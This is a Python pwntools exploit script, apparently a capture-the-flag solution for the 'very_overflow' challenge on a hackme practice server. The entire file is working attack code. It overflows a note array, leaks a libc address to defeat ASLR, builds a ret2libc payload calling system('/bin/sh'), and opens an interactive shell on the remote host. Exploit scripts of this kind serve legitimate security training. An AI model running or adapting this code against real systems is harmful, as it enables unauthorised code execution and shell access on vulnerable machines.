#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./very_overflow")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    one_gadget_offset = 0x5f7a6
else:
    io = remote("hackme.inndy.tw", 7705)
    libc = ELF("./libc-2.23.so.i386")
    one_gadget_offset = 0x5faa5

def debug():
    addr = int(raw_input("DEBUG: "), 16)
    gdb.attach(io, "b *" + str(addr))


def add(content):
    #  io.sendlineafter("action: ", "1")
    io.sendline("1")
    #  io.sendlineafter("your note: ", content)
    io.sendline(content)

def show(idx):
    io.sendlineafter("action: ", "3")
    io.sendlineafter("to show: ", str(idx))

def edit(idx, data):
    io.sendlineafter("action: ", "2")
    io.sendlineafter("to edit: ", str(idx))
    io.sendlineafter("new data: ", data)

def exit():
    io.sendlineafter("action: ", "5")

if __name__ == "__main__":
    for i in xrange(128):
        #  print i
        #  sleep(0.01)
        add(cyclic(132))

    #  debug()
    add(cyclic(0x2b - 1))
    show(129)
    io.recvuntil("Next note: ")
    #  libc_base = int(io.recvuntil("\n", drop = True), 16) - 246 - libc.symbols["__libc_start_main"]
    libc_base = int(io.recvuntil("\n", drop = True), 16) - 247 - libc.symbols["__libc_start_main"]
    info("libc_base -> 0x%x" % libc_base)
    sys_addr = libc_base + libc.symbols["system"]
    info("sys_addr -> 0x%x" % sys_addr)
    sh_addr = libc_base + next(libc.search("/bin/sh"))
    info("sh_addr -> 0x%x" % sh_addr)

    one_gadget = libc_base + one_gadget_offset
    info("one_gadget -> 0x%x" % one_gadget)
    #  payload = p32(one_gadget) * 4
    payload = cyclic(12) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)
    edit(128, payload)

    exit()
    io.interactive()
